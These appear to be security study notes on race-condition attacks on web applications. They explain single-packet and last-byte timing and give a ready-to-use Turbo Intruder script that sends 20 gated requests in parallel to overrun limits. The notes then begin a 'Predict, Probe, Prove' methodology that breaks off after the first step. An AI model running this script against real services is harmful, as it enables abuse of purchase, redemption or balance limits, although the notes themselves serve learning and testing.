--------------

### RACE CONDITIONS

---------------

- Limit Overrun attack with `single packet attack technique`.The single-packet attack enables you to completely neutralize interference from network jitter by using a single TCP packet to complete 20-30 requests simultaneously.Single packet is for `HTTP/2` while last byte atttack is for `HTTP/1`.

- Exploiting Limit Overrun with Turbo Intruder if the target support `HTTP/2`-:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```

- Set `engine` to `engine=Engine.BURP2` and `concurrentConnections=1`
- When queueing your requests, group them by assigning them to a named gate using the gate argument for the `engine.queue()` method.
- Open the respective gate with the engine.openGate() method.

--------------------

### Race Conditions Methodology to find hidden multi-step sequences

---------------------

### Predict,Probe, Prove

--------------------

- Predict-:
  -  Is the enpoint critical
  -   For a successful collision, you typically need two or more requests that trigger operations on the same record.
